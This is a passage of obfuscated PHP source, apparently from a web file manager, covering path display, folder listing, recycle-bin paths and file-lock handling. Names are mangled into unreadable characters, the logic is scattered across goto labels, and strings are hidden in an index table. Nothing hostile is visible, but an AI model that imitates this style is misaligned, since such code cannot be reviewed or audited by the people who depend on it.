unset($eﬂìØ€Ü”¡[$Cå™Ô’¬Ïå]); continue; } $Bﬁ‘≠Éè©› = $EΩ‰ˆãåÙÉ->listData($DÛõåÆçÜ‡[$d°∫“Û»ΩÜ[408]]); goto f‰êäò•É∫; B¢è÷ú…÷Í: $D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[506]] = Model($d°∫“Û»ΩÜ[507])->getInfoSimpleOuter($D®Ç…¶ª…≈[$d°∫“Û»ΩÜ[446]]); $eﬂìØ€Ü”¡[$Cå™Ô’¬Ïå] = $D®Ç…¶ª…≈; goto BóµñÿÆ˜±; BóµñÿÆ˜±: } goto dﬂ⁄›ô“„ü; a¥Çà∆æ¡: $eﬂìØ€Ü”¡ = array_to_keyvalue($eﬂìØ€Ü”¡, $d°∫“Û»ΩÜ[397]); $BΩÏåÕ¨È– = json_decode(Model($d°∫“Û»ΩÜ[427])->get($d°∫“Û»ΩÜ[503]), !0); $BΩÏåÕ¨È– = array_to_keyvalue($BΩÏåÕ¨È–, $d°∫“Û»ΩÜ[395]); goto bâáüª«ñì; dﬂ⁄›ô“„ü: } $céåÈöìÚè = defined($d°∫“Û»ΩÜ[508]) ? USER_ID : $d°∫“Û»ΩÜ[33]; $a∆¯≥ÔıÜâ = array(); goto e»¯‚°Öö¯; f®∞»Ÿ∞ﬂº: } public function groupPathDisplay(&$e∂¨Œ°†≠£) { goto aß™§¥≤ñ¡; aß™§¥≤ñ¡: $e¢óÌÙÑ†ò =& $_SERVER[’ÿƒ†ïò]; if ($e∂¨Œ°†≠£[$e¢óÌÙÑ†ò[406]] != self::TYPE_GROUP) { return; } $e‰Üè˘Œπ• = Model($e¢óÌÙÑ†ò[516])->getInfo($e∂¨Œ°†≠£[$e¢óÌÙÑ†ò[498]]); goto EÁÆ”îö∏È; F∆ﬁ•ÂÛåú: $e∂¨Œ°†≠£[$e¢óÌÙÑ†ò[517]] = $e‰Üè˘Œπ•[$e¢óÌÙÑ†ò[492]]; $e∂¨Œ°†≠£[$e¢óÌÙÑ†ò[518]] = $e‰Üè˘Œπ•[$e¢óÌÙÑ†ò[515]]; $e∂¨Œ°†≠£[$e¢óÌÙÑ†ò[519]] = $e‰Üè˘Œπ•[$e¢óÌÙÑ†ò[520]]; goto b°ßíº∑ÉÂ; EÁÆ”îö∏È: $Eñ£€çΩÒ¿ = $this->parentLevelArray($e‰Üè˘Œπ•[$e¢óÌÙÑ†ò[515]]); $Cò¥ıÚí•Ú = $e¢óÌÙÑ†ò[33]; foreach ($Eñ£€çΩÒ¿ as $F‚ç≥‹€í´) { $Aàòéíıˆ» = Model($e¢óÌÙÑ†ò[516])->getInfo($F‚ç≥‹€í´); $Cò¥ıÚí•Ú .= $Aàòéíıˆ»[$e¢óÌÙÑ†ò[85]][$e¢óÌÙÑ†ò[397]] . $e¢óÌÙÑ†ò[47]; } goto F∆ﬁ•ÂÛåú; b°ßíº∑ÉÂ: $e∂¨Œ°†≠£[$e¢óÌÙÑ†ò[521]] = $Cò¥ıÚí•Ú . $e‰Üè˘Œπ•[$e¢óÌÙÑ†ò[85]][$e¢óÌÙÑ†ò[397]]; goto D§≥Ñ’Ø¬∆; D§≥Ñ’Ø¬∆: } protected function _listAppendPath(&$CÇöŸ’ºô , $d©‚Ëåˆ‡Í = false) { goto DÂÑ±§†∫é; E•…Îıﬁâ…: unset($côÖÒ–À∞ù); return $CÇöŸ’ºô ; goto FıôãÓ˘√ü; FÉå“ÂÉ·ñ: unset($côÖÒ–À∞ù); $aã≈ÇõÒ¿ß = array_unique($aã≈ÇõÒ¿ß); if (count($aã≈ÇõÒ¿ß) > 0) { $bøïÖ“ˆŸç = array($CíﬂÚü®æŒ[412] => array($CíﬂÚü®æŒ[413], $aã≈ÇõÒ¿ß)); if (count($aã≈ÇõÒ¿ß) == 1) { $Cî£ıûÜœ◊ = $this->sourceInfo($aã≈ÇõÒ¿ß[0]); $B∫∏Œâ·Àè = is_array($Cî£ıûÜœ◊) ? array($Cî£ıûÜœ◊) : !1; } else { $B∫∏Œâ·Àè = $this->field($CíﬂÚü®æŒ[522])->where($bøïÖ“ˆŸç)->select(); } if (!$B∫∏Œâ·Àè) { $B∫∏Œâ·Àè = array(); } foreach ($B∫∏Œâ·Àè as $fƒ‡à∑¶›ı) { $b∏´‡Â∆çÕ[$fƒ‡à∑¶›ı[$CíﬂÚü®æŒ[397]]] = $fƒ‡à∑¶›ı[$CíﬂÚü®æŒ[28]]; } } goto bØ†™ˆ®ñ¯; DÂÑ±§†∫é: $CíﬂÚü®æŒ =& $_SERVER[’ÿƒ†ïò]; static $b∏´‡Â∆çÕ = array(); $aã≈ÇõÒ¿ß = array(); goto f®çµ„ì« ; f®çµ„ì« : $DŒ˘Àßµ¶„ = array(); if ($d©‚Ëåˆ‡Í) { return $b∏´‡Â∆çÕ; } foreach ($CÇöŸ’ºô  as &$côÖÒ–À∞ù) { goto bË±≠ê®™É; bË±≠ê®™É: $aÕìÎ‘¶Ç∫ = $côÖÒ–À∞ù[$CíﬂÚü®æŒ[397]]; if ($côÖÒ–À∞ù[$CíﬂÚü®æŒ[405]] == $CíﬂÚü®æŒ[87] && $côÖÒ–À∞ù[$CíﬂÚü®æŒ[492]] != 0) { $b∏´‡Â∆çÕ[$aÕìÎ‘¶Ç∫] = $côÖÒ–À∞ù[$CíﬂÚü®æŒ[28]]; } if ($côÖÒ–À∞ù[$CíﬂÚü®æŒ[405]] == $CíﬂÚü®æŒ[87] && $côÖÒ–À∞ù[$CíﬂÚü®æŒ[492]] == 0 && !isset($b∏´‡Â∆çÕ[$aÕìÎ‘¶Ç∫])) { $b∏´‡Â∆çÕ[$aÕìÎ‘¶Ç∫] = $this->_listAppendPathRoot($côÖÒ–À∞ù, array()); } goto a±ç§¢ŸéÇ; a±ç§¢ŸéÇ: if (isset($DŒ˘Àßµ¶„[$côÖÒ–À∞ù[$CíﬂÚü®æŒ[515]]])) { continue; } $DŒ˘Àßµ¶„[$côÖÒ–À∞ù[$CíﬂÚü®æŒ[515]]] = !0; $E¿˘üêê√â = $this->parentLevelArray($côÖÒ–À∞ù[$CíﬂÚü®æŒ[515]]); goto E≤Ÿ⁄ÎòŸ; E≤Ÿ⁄ÎòŸ: foreach ($E¿˘üêê√â as $bÊÂÌ™Ãõé => $bµ≈‚¬õÍ™) { if (isset($b∏´‡Â∆çÕ[$bµ≈‚¬õÍ™])) { continue; } if ($bÊÂÌ™Ãõé == 0) { $b∏´‡Â∆çÕ[$bµ≈‚¬õÍ™] = $this->_listAppendPathRoot($côÖÒ–À∞ù, $E¿˘üêê√â); } if ($bÊÂÌ™Ãõé != 0) { $aã≈ÇõÒ¿ß[] = $bµ≈‚¬õÍ™; } } goto EÜîÑêŒ›∑; EÜîÑêŒ›∑: } goto FÉå“ÂÉ·ñ; bØ†™ˆ®ñ¯: $dÃ◊’ﬁÜâõ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Eô∂ãŸµ£‚ = array(); foreach ($CÇöŸ’ºô  as &$côÖÒ–À∞ù) { goto FÒâŸÏµÖ“; A„ú»ñ∑¬: $C®òèäÌÓç .= $côÖÒ–À∞ù[$CíﬂÚü®æŒ[28]]; if ($côÖÒ–À∞ù[$CíﬂÚü®æŒ[405]] == $CíﬂÚü®æŒ[87]) { $C®òèäÌÓç .= $CíﬂÚü®æŒ[8]; } $côÖÒ–À∞ù[$CíﬂÚü®æŒ[513]] = str_replace($CíﬂÚü®æŒ[523], $CíﬂÚü®æŒ[8], $C®òèäÌÓç); goto a¿íæ ªóÕ; a¿íæ ªóÕ: if ($côÖÒ–À∞ù[$CíﬂÚü®æŒ[492]] == $CíﬂÚü®æŒ[191]) { $côÖÒ–À∞ù[$CíﬂÚü®æŒ[28]] = trim($b∏´‡Â∆çÕ[$côÖÒ–À∞ù[$CíﬂÚü®æŒ[397]]], $CíﬂÚü®æŒ[8]); $côÖÒ–À∞ù[$CíﬂÚü®æŒ[513]] = $côÖÒ–À∞ù[$CíﬂÚü®æŒ[28]] . $CíﬂÚü®æŒ[8]; } if (intval($côÖÒ–À∞ù[$CíﬂÚü®æŒ[406]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($côÖÒ–À∞ù, $E¿˘üêê√â, $dÃ◊’ﬁÜâõ); } goto dçÖí•ë“Ì; FÒâŸÏµÖ“: $D‡Ñ€öÒÁ„ = $côÖÒ–À∞ù[$CíﬂÚü®æŒ[515]]; $C®òèäÌÓç = $CíﬂÚü®æŒ[33]; if (isset($Eô∂ãŸµ£‚[$D‡Ñ€öÒÁ„])) { $C®òèäÌÓç = $Eô∂ãŸµ£‚[$D‡Ñ€öÒÁ„]; } else { $E¿˘üêê√â = $this->parentLevelArray($côÖÒ–À∞ù[$CíﬂÚü®æŒ[515]]); foreach ($E¿˘üêê√â as $bÊÂÌ™Ãõé => $bµ≈‚¬õÍ™) { if (isset($b∏´‡Â∆çÕ[$bµ≈‚¬õÍ™])) { $C®òèäÌÓç .= $b∏´‡Â∆çÕ[$bµ≈‚¬õÍ™] . $CíﬂÚü®æŒ[8]; } } $Eô∂ãŸµ£‚[$D‡Ñ€öÒÁ„] = $C®òèäÌÓç; } goto A„ú»ñ∑¬; dçÖí•ë“Ì: } goto E•…Îıﬁâ…; FıôãÓ˘√ü: } private function _listAppendPathRecycle(&$CªÛ¿∫Ñ—‚, $aÖÇ∂ë⁄òê, $aö◊°π„ÙÖ) { goto d≈≈ı∂ûëú; fø¯°ß¬ÿ˜: if ($CªÛ¿∫Ñ—‚[$aãŒÖáﬁù”[397]] == $aö◊°π„ÙÖ) { $CªÛ¿∫Ñ—‚[$aãŒÖáﬁù”[515]] = $aãŒÖáﬁù”[525]; $CªÛ¿∫Ñ—‚[$aãŒÖáﬁù”[492]] = $aãŒÖáﬁù”[191]; $CªÛ¿∫Ñ—‚[$aãŒÖáﬁù”[28]] = LNG($aãŒÖáﬁù”[524]); } $CªÛ¿∫Ñ—‚[$aãŒÖáﬁù”[526]] = $aãŒÖáﬁù”[527]; goto dÇ â™®ˆ∆; d≈≈ı∂ûëú: $aãŒÖáﬁù” =& $_SERVER[’ÿƒ†ïò]; if (!in_array($aö◊°π„ÙÖ, $aÖÇ∂ë⁄òê) && $CªÛ¿∫Ñ—‚[$aãŒÖáﬁù”[397]] != $aö◊°π„ÙÖ) { return; } $CåÌÀçõ≠® = explode($aãŒÖáﬁù”[8], trim($CªÛ¿∫Ñ—‚[$aãŒÖáﬁù”[513]], $aãŒÖáﬁù”[8])); goto c·≠åàÖà†; c·≠åàÖà†: $eﬂ∏¡çúÏ˜ = implode($aãŒÖáﬁù”[8], array_slice($CåÌÀçõ≠®, 2)); $CªÛ¿∫Ñ—‚[$aãŒÖáﬁù”[513]] = $aãŒÖáﬁù”[8] . LNG($aãŒÖáﬁù”[524]) . $aãŒÖáﬁù”[8] . ltrim($eﬂ∏¡çúÏ˜, $aãŒÖáﬁù”[8]); $CªÛ¿∫Ñ—‚[$aãŒÖáﬁù”[515]] = $aãŒÖáﬁù”[525] . implode($aãŒÖáﬁù”[47], array_slice($aÖÇ∂ë⁄òê, 1)) . $aãŒÖáﬁù”[47]; goto fø¯°ß¬ÿ˜; dÇ â™®ˆ∆: } protected function _listAppendPathRoot(&$E¢Ï†∞Ô¯, $aå∑ùà°ßï) { $BÖ§´∞Ç∏ë =& $_SERVER[’ÿƒ†ïò]; $eÖ√˜Ωô©ç = $BÖ§´∞Ç∏ë[33]; if ($E¢Ï†∞Ô¯[$BÖ§´∞Ç∏ë[406]] == self::TYPE_USER) { if (defined($BÖ§´∞Ç∏ë[468]) && $E¢Ï†∞Ô¯[$BÖ§´∞Ç∏ë[498]] == USER_ID) { $eÖ√˜Ωô©ç = LNG($BÖ§´∞Ç∏ë[528]); if (!$aå∑ùà°ßï) { $E¢Ï†∞Ô¯[$BÖ§´∞Ç∏ë[28]] = $eÖ√˜Ωô©ç; } } else { $Eè£‚’œ°˘ = Model($BÖ§´∞Ç∏ë[507])->getInfoSimple($E¢Ï†∞Ô¯[$BÖ§´∞Ç∏ë[498]]); $eÖ√˜Ωô©ç = LNG($BÖ§´∞Ç∏ë[529]) . $BÖ§´∞Ç∏ë[160] . $Eè£‚’œ°˘[$BÖ§´∞Ç∏ë[28]] . $BÖ§´∞Ç∏ë[530]; } } else { if ($E¢Ï†∞Ô¯[$BÖ§´∞Ç∏ë[406]] == self::TYPE_GROUP) { $Eè£‚’œ°˘ = Model($BÖ§´∞Ç∏ë[516])->getInfoSimple($E¢Ï†∞Ô¯[$BÖ§´∞Ç∏ë[498]]); $eÖ√˜Ωô©ç = $Eè£‚’œ°˘[$BÖ§´∞Ç∏ë[28]]; } else { if ($E¢Ï†∞Ô¯[$BÖ§´∞Ç∏ë[406]] == self::TYPE_SYSTEM) { $eÖ√˜Ωô©ç = $BÖ§´∞Ç∏ë[531]; } } } $eÖ√˜Ωô©ç = $eÖ√˜Ωô©ç ? $BÖ§´∞Ç∏ë[8] . $eÖ√˜Ωô©ç . $BÖ§´∞Ç∏ë[8] : $BÖ§´∞Ç∏ë[8]; return $eÖ√˜Ωô©ç; } protected function _listAppendUser(&$E‘ˆïí‹Ìà) { goto f¶ﬁÔÇ£Ø ; FØÏÀÚöÌá: $f„¥ÓÛ›òÎ = array_merge($cƒÃ»µã≥«, $D‚¨àƒä¯∂); $aﬁﬂÚê¢îï = Model($EµÌ¿‰¡˜º[532])->userListInfo($f„¥ÓÛ›òÎ); foreach ($E‘ˆïí‹Ìà as &$B†‘·ù≈øê) { $eÖ§æü‡àƒ = $B†‘·ù≈øê[$EµÌ¿‰¡˜º[446]]; $B†‘·ù≈øê[$EµÌ¿‰¡˜º[446]] = $aﬁﬂÚê¢îï[$eÖ§æü‡àƒ] ? $aﬁﬂÚê¢îï[$eÖ§æü‡àƒ] : !1; $eÖ§æü‡àƒ = $B†‘·ù≈øê[$EµÌ¿‰¡˜º[448]]; $B†‘·ù≈øê[$EµÌ¿‰¡˜º[448]] = $aﬁﬂÚê¢îï[$eÖ§æü‡àƒ] ? $aﬁﬂÚê¢îï[$eÖ§æü‡àƒ] : !1; if (isset($B†‘·ù≈øê[$EµÌ¿‰¡˜º[459]]) && $B†‘·ù≈øê[$EµÌ¿‰¡˜º[459]][$EµÌ¿‰¡˜º[533]]) { $e∆Ë¶˜ïÎ¢ = $GLOBALS[$EµÌ¿‰¡˜º[6]][$EµÌ¿‰¡˜º[88]][$EµÌ¿‰¡˜º[534]]; if ($B†‘·ù≈øê[$EµÌ¿‰¡˜º[459]][$EµÌ¿‰¡˜º[535]] <= time() - $e∆Ë¶˜ïÎ¢) { $this->metaSet($B†‘·ù≈øê[$EµÌ¿‰¡˜º[397]], $EµÌ¿‰¡˜º[533], null); $this->metaSet($B†‘·ù≈øê[$EµÌ¿‰¡˜º[397]], $EµÌ¿‰¡˜º[535], null); unset($B†‘·ù≈øê[$EµÌ¿‰¡˜º[459]][$EµÌ¿‰¡˜º[533]]); continue; } $bµ¿∏±∂‰Â = $B†‘·ù≈øê[$EµÌ¿‰¡˜º[459]][$EµÌ¿‰¡˜º[533]]; $B†‘·ù≈øê[$EµÌ¿‰¡˜º[459]][$EµÌ¿‰¡˜º[536]] = Model($EµÌ¿‰¡˜º[532])->getInfoSimpleOuter($bµ¿∏±∂‰Â); } } goto d¬’ÎôÉ∑«; f¶ﬁÔÇ£Ø : $EµÌ¿‰¡˜º =& $_SERVER[’ÿƒ†ïò]; $cƒÃ»µã≥« = array_to_keyvalue($E‘ˆïí‹Ìà, $EµÌ¿‰¡˜º[33], $EµÌ¿‰¡˜º[446]); $D‚¨àƒä¯∂ = array_to_keyvalue($E‘ˆïí‹Ìà, $EµÌ¿‰¡˜º[33], $EµÌ¿‰¡˜º[448]); goto FØÏÀÚöÌá; d¬’ÎôÉ∑«: unset($B†‘·ù≈øê); goto f¢£ßØƒ∏é; f¢£ßØƒ∏é: } public function parentLevelArray($a°¯é®Ç¬˜) { $AèáÖäı£Ù =& $_SERVER[’ÿƒ†ïò]; $a°¯é®Ç¬˜ = explode($AèáÖäı£Ù[47], trim($a°¯é®Ç¬˜, $AèáÖäı£Ù[47])); return array_remove_value($a°¯é®Ç¬˜, $AèáÖäı£Ù[191]); } public function listAll($b§€¡áÌéŸ) { goto dˆîë•÷ÑÛ; cƒ·¡´çíë: $this->_listAppendAuth($CÔêçÑÒ∑ü); $this->_listAppendUser($CÔêçÑÒ∑ü); $this->_listAppendPath($CÔêçÑÒ∑ü); goto E÷“¬çéÒê; CÙêøáÉÀè: $CòåÉ©µƒá = $F£î±‰öú–[541]; $FåÛñêúÚ£ = "\x4c\105\106\124\x20\112\117\111\116\x20{$this->tablePrefix}\151\157\x5f\146\151\154\x65\x20\x66\x69\154\145\40\x6f\156\40\163\x6f\165\162\143\145\56\146\151\154\145\111\104\x20\75\40\x66\151\x6c\x65\x2e\146\x69\x6c\145\x49\x44"; $CÔêçÑÒ∑ü = $this->alias($F£î±‰öú–[438])->field($CòåÉ©µƒá)->where($D™õ∑±Çâﬁ)->join($FåÛñêúÚ£)->select(); goto cƒ·¡´çíë; E÷“¬çéÒê: $CÔêçÑÒ∑ü = array_to_keyvalue($CÔêçÑÒ∑ü, $F£î±‰öú–[397]); $fÙçúÔ—ä∏ = "\57{$c≤ÉìÕ´û∆[$F£î±‰öú–[28]]}\57"; $fÙçúÔ—ä∏ = $fÙçúÔ—ä∏ == $F£î±‰öú–[523] ? $F£î±‰öú–[8] : $fÙçúÔ—ä∏; goto Bñµ£ˆäúÑ; Bñµ£ˆäúÑ: $fõÙåƒâ– = array(); foreach ($CÔêçÑÒ∑ü as $BÓ¡Ñı™â® => $cåÖø®É‚í) { goto d™çà‰…⁄ı; b˜äÓåøê: $C„â√»ﬂºæ = str_replace($F£î±‰öú–[523], $F£î±‰öú–[8], $C„â√»ﬂºæ); $C„â√»ﬂºæ = str_replace($F£î±‰öú–[523], $F£î±‰öú–[8], $C„â√»ﬂºæ); $Aëó“™ùá¯ = array($F£î±‰öú–[416] => str_replace($F£î±‰öú–[523], $F£î±‰öú–[8], $C„â√»ﬂºæ), $F£î±‰öú–[542] => intval($cåÖø®É‚í[$F£î±‰öú–[405]]), $F£î±‰öú–[85] => $this->pathInfoFilter($cåÖø®É‚í)); goto DŒÙƒåïÑª; DŒÙƒåïÑª: if (!$cåÖø®É‚í[$F£î±‰öú–[405]]) { $Aëó“™ùá¯[$F£î±‰öú–[461]] = $cåÖø®É‚í[$F£î±‰öú–[461]]; $Aëó“™ùá¯[$F£î±‰öú–[86]] = $cåÖø®É‚í[$F£î±‰öú–[76]]; } $fõÙåƒâ–[] = $Aëó“™ùá¯; goto C‡Ùı≥™›¿; d™çà‰…⁄ı: $a¡Øåﬂ•ìÌ = $this->parentLevelArray($cåÖø®É‚í[$F£î±‰öú–[515]]); array_shift($a¡Øåﬂ•ìÌ); $C„â√»ﬂºæ = $fÙçúÔ—ä∏; goto bäöîπ∞∞÷; bäöîπ∞∞÷: for ($f”ﬂÜÍ‚ïæ = 0; $f”ﬂÜÍ‚ïæ < count($a¡Øåﬂ•ìÌ); $f”ﬂÜÍ‚ïæ++) { $C„â√»ﬂºæ .= $CÔêçÑÒ∑ü[$a¡Øåﬂ•ìÌ[$f”ﬂÜÍ‚ïæ]][$F£î±‰öú–[28]] . $F£î±‰öú–[8]; } $C„â√»ﬂºæ .= $cåÖø®É‚í[$F£î±‰öú–[28]]; if ($cåÖø®É‚í[$F£î±‰öú–[405]]) { $C„â√»ﬂºæ .= $F£î±‰öú–[8]; } goto b˜äÓåøê; C‡Ùı≥™›¿: } return $fõÙåƒâ–; goto Cø˜˘ÜÊ∏Ú; dˆîë•÷ÑÛ: $F£î±‰öú– =& $_SERVER[’ÿƒ†ïò]; $c≤ÉìÕ´û∆ = $this->sourceInfo($b§€¡áÌéŸ); $D™õ∑±Çâﬁ = array($F£î±‰öú–[537] => array($F£î±‰öú–[538], $c≤ÉìÕ´û∆[$F£î±‰öú–[515]] . $b§€¡áÌéŸ . $F£î±‰öú–[539]), $F£î±‰öú–[540] => 0); goto CÙêøáÉÀè; Cø˜˘ÜÊ∏Ú: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($cœèôëπ˘¡) { goto aµﬂÙµ£„ø; c‡ÉÓ…»Ô…: $B‡≥Á◊òé¡ = 1; $this->_lockEvent($cœèôëπ˘¡, array($eıÛÌ¿Ë›Ó[544], $eıÛÌ¿Ë›Ó[545]), $B‡≥Á◊òé¡); $this->_lockParent($cœèôëπ˘¡, array($eıÛÌ¿Ë›Ó[545]), $B‡≥Á◊òé¡); goto FûÖÜî‘è„; aµﬂÙµ£„ø: $eıÛÌ¿Ë›Ó =& $_SERVER[’ÿƒ†ïò]; if (!$this->allowLock()) { return; } $this->_lockCheck($eıÛÌ¿Ë›Ó[543], $cœèôëπ˘¡); goto c‡ÉÓ…»Ô…; FûÖÜî‘è„: $this->_lockEvent($cœèôëπ˘¡, array($eıÛÌ¿Ë›Ó[546], $eıÛÌ¿Ë›Ó[547]), $B‡≥Á◊òé¡); $this->_lockCheckEnd($eıÛÌ¿Ë›Ó[543], $cœèôëπ˘¡); goto aæ®Â ò∆ƒ; aæ®Â ò∆ƒ: } public function lockCopyEnd($bÂ≠ê™∂Â¿) { $BüÊ—∏æïﬂ =& $_SERVER[’ÿƒ†ïò]; if (!$this->allowLock()) { return; } $Aì¢æÃÚæ∆ = 0; $this->_lockEvent($bÂ≠ê™∂Â¿, array($BüÊ—∏æïﬂ[544], $BüÊ—∏æïﬂ[545]), $Aì¢æÃÚæ∆); $this->_lockParent($bÂ≠ê™∂Â¿, array($BüÊ—∏æïﬂ[545]), $Aì¢æÃÚæ∆); $this->_lockEvent($bÂ≠ê™∂Â¿, array($BüÊ—∏æïﬂ[546], $BüÊ—∏æïﬂ[547]), $Aì¢æÃÚæ∆); } public function lockWriteStart($Dê®⁄®¿È≈, $A≤–õí©∏‡ = '') { goto cÿëçÒéàœ; cÿëçÒéàœ: $EÉ≠öøÌéø =& $_SERVER[’ÿƒ†ïò]; if (!$this->allowLock()) { return; } $this->_lockCheck($EÉ≠öøÌéø[544], $Dê®⁄®¿È≈); goto CÉ÷ÉÏêü˜; CÉ÷ÉÏêü˜: $Báñì∆è§≥ = 1; $this->_lockKey($EÉ≠öøÌéø[548] . $Dê®⁄®¿È≈ . $EÉ≠öøÌéø[95] . $A≤–õí©∏‡, $Báñì∆è§≥); $this->_lockEvent($Dê®⁄®¿È≈, array($EÉ≠öøÌéø[543], $EÉ≠öøÌéø[545]), $Báñì∆è§≥); goto Cò◊´ÑÀÎ÷; Cò◊´ÑÀÎ÷: $this->_lockParent($Dê®⁄®¿È≈, array($EÉ≠öøÌéø[543], $EÉ≠öøÌéø[545]), $Báñì∆è§≥); $this->_lockCheckEnd($EÉ≠öøÌéø[544], $Dê®⁄®¿È≈); goto dù∫∂Î¶ää; dù∫∂Î¶ää: } public function lockWriteEnd($C‰ÖËãëﬂª, $döÃ’ æÜØ = '') { $d⁄É’Êº˜â =& $_SERVER[’ÿƒ†ïò]; if (!$this->allowLock()) { return; } $aßÙ”ﬁ˘áÂ = 0; $this->_lockKey($d⁄É’Êº˜â[548] . $C‰ÖËãëﬂª . $d⁄É’Êº˜â[95] . $döÃ’ æÜØ, $aßÙ”ﬁ˘áÂ); $this->_lockEvent($C‰ÖËãëﬂª, array($d⁄É’Êº˜â[543], $d⁄É’Êº˜â[545]), $aßÙ”ﬁ˘áÂ); $this->_lockParent($C‰ÖËãëﬂª, array($d⁄É’Êº˜â[543], $d⁄É’Êº˜â[545]), $aßÙ”ﬁ˘áÂ); } public function lockMoveStart($c¥ÈÌãí—™) { goto aìÀÿÜË‰Ï; eˆô»Ú–ñ’: $bµûÎÔÚ≥∆ = 1; $this->_lockKey($eÑÿÃ‰ª”§[549] . $c¥ÈÌãí—™, $bµûÎÔÚ≥∆); $this->_lockEvent($c¥ÈÌãí—™, array($eÑÿÃ‰ª”§[543], $eÑÿÃ‰ª”§[544]), $bµûÎÔÚ≥∆); goto f¡ä–ﬁÃêõ; f¡ä–ﬁÃêõ: $this->_lockParent($c¥ÈÌãí—™, array($eÑÿÃ‰ª”§[543], $eÑÿÃ‰ª”§[545]), $bµûÎÔÚ≥∆); $this->_lockEvent($c¥ÈÌãí—™, array($eÑÿÃ‰ª”§[550], $eÑÿÃ‰ª”§[546], $eÑÿÃ‰ª”§[547]), $bµûÎÔÚ≥∆); $this->_lockCheckEnd($eÑÿÃ‰ª”§[545], $c¥ÈÌãí—™); goto c±©úíöÔä; aìÀÿÜË‰Ï: $eÑÿÃ‰ª”§ =& $_SERVER[’ÿƒ†ïò]; if (!$this->allowLock()) { return; } $this->_lockCheck($eÑÿÃ‰ª”§[545], $c¥ÈÌãí—™); goto eˆô»Ú–ñ’; c±©úíöÔä: } public function lockMoveEnd($F¯§‚≠ßÆ’) { goto Dá®›ûﬂé¢; Dá®›ûﬂé¢: $c´îÒæÜé◊ =& $_SERVER[’ÿƒ†ïò]; if (!$this->allowLock()) { return; } $a≤ˆ‘ÖÆªî = 0; goto cä≈ö›’Ÿ‹; Fã‹ØÌã≈—: $this->_lockEvent($F¯§‚≠ßÆ’, array($c´îÒæÜé◊[550], $c´îÒæÜé◊[546], $c´îÒæÜé◊[547]), $a≤ˆ‘ÖÆªî); goto bÊ“®âÙÆ¯; cä≈ö›’Ÿ‹: $this->_lockKey($c´îÒæÜé◊[549] . $F¯§‚≠ßÆ’, $a≤ˆ‘ÖÆªî); $this->_lockEvent($F¯§‚≠ßÆ’, array($c´îÒæÜé◊[543], $c´îÒæÜé◊[544]), $a≤ˆ‘ÖÆªî); $this->_lockParent($F¯§‚≠ßÆ’, array($c´îÒæÜé◊[543], $c´îÒæÜé◊[545]), $a≤ˆ‘ÖÆªî); goto Fã‹ØÌã≈—; bÊ“®âÙÆ¯: } private function _lockCheck($fÆ¶¿ó≠›¶, $d™À“–ÿ≤ä) { goto dîâ¯òÑß‡; F∑Ã≤≠∂Á‘: CacheLock::setErrorMsg($Dœ‡ƒÌä‡†[160] . htmlspecialchars($E„’”ªîÙõ[$Dœ‡ƒÌä‡†[28]]) . $Dœ‡ƒÌä‡†[530] . $AÉ±âáñêË); $this->_lockKey($aÎù‰æŸ”…, 1); $this->_lockKey($aÎù‰æŸ”…, 0); goto E∂ÿ»∂ÆáÜ; E∂ÿ»∂ÆáÜ: $A««‹í◊ß≠ = array_reverse($this->parentLevelArray($E„’”ªîÙõ[$Dœ‡ƒÌä‡†[515]])); foreach ($A««‹í◊ß≠ as $A◊˜úÎ…œ˘) { $aÎù‰æŸ”… = $fÆ¶¿ó≠›¶ . $Dœ‡ƒÌä‡†[552] . $A◊˜úÎ…œ˘; if (CacheLock::lockGet($Dœ‡ƒÌä‡†[553] . $aÎù‰æŸ”…)) { $E„’”ªîÙõ = $this->sourceInfo($A◊˜úÎ…œ˘); CacheLock::setErrorMsg($Dœ‡ƒÌä‡†[160] . htmlspecialchars($E„’”ªîÙõ[$Dœ‡ƒÌä‡†[28]]) . $Dœ‡ƒÌä‡†[530] . $AÉ±âáñêË); $this->_lockKey($aÎù‰æŸ”…, 1); $this->_lockKey($aÎù‰æŸ”…, 0); } } goto EÜ∞â—÷áá; dîâ¯òÑß‡: $Dœ‡ƒÌä‡† =& $_SERVER[’ÿƒ†ïò]; $E„’”ªîÙõ = $this->sourceInfo($d™À“–ÿ≤ä); $aÎù‰æŸ”… = $fÆ¶¿ó≠›¶ . $Dœ‡ƒÌä‡†[95] . $d™À“–ÿ≤ä; goto Bç‚“òÊﬁÓ; Bç‚“òÊﬁÓ: $this->_lockTimeStart[$aÎù‰æŸ”…] = timeFloat(); if (!is_array($E„’”ªîÙõ)) { return; } $AÉ±âáñêË = LNG($Dœ‡ƒÌä‡†[551]); goto F∑Ã≤≠∂Á‘; EÜ∞â—÷áá: } private function _lockCheckEnd($e•ëËú’ÖË, $f⁄»·íÇ∫) { goto F‰•É€úåù; cê∆ùºŸ£¬: if (!isset($this->_lockTimeStart[$E¨§òß≈‡¨])) { return; } $dÛ§œŒÎó≥ = timeFloat() - $this->_lockTimeStart[$E¨§òß≈‡¨]; unset($this->_lockTimeStart[$E¨§òß≈‡¨]); goto A€⁄õ¬⁄Üˆ; F‰•É€úåù: $fõø¢∆¥Óπ =& $_SERVER[’ÿƒ†ïò]; $E¨§òß≈‡¨ = $e•ëËú’ÖË . $fõø¢∆¥Óπ[95] . $f⁄»·íÇ∫; CacheLock::setErrorMsg($fõø¢∆¥Óπ[376]); goto cê∆ùºŸ£¬; A€⁄õ¬⁄Üˆ: if ($dÛ§œŒÎó≥ > 0.5) { unset(self::$cacheSourceInfo[$fõø¢∆¥Óπ[452] . $f⁄»·íÇ∫]); } $aÜœäƒ√‰ = $this->sourceInfo($f⁄»·íÇ∫); if (!$aÜœäƒ√‰) { show_json(LNG($fõø¢∆¥Óπ[105]), !1); } goto CÙÙ•≈∂≈ó; CÙÙ•≈∂≈ó: } private function _lockParent($DíÕ∆–÷ÿà, $a‰âﬂ≥ì˘¡, $føÜéúåâÊ) { if (!$this->autoLockSet) { return; } $a¶Ñäÿ≈⁄æ = $this->sourceInfo($DíÕ∆–÷ÿà); if (!is_array($a¶Ñäÿ≈⁄æ)) { return; } $cÓ⁄íßÉ◊¢ = array_reverse($this->parentLevelArray($a¶Ñäÿ≈⁄æ[$_SERVER[’ÿƒ†ïò][515]])); foreach ($cÓ⁄íßÉ◊¢ as $dŒ≥óÌÙÛ–) { $this->_lockEvent($dŒ≥óÌÙÛ–, $a‰âﬂ≥ì˘¡, $føÜéúåâÊ); } } private 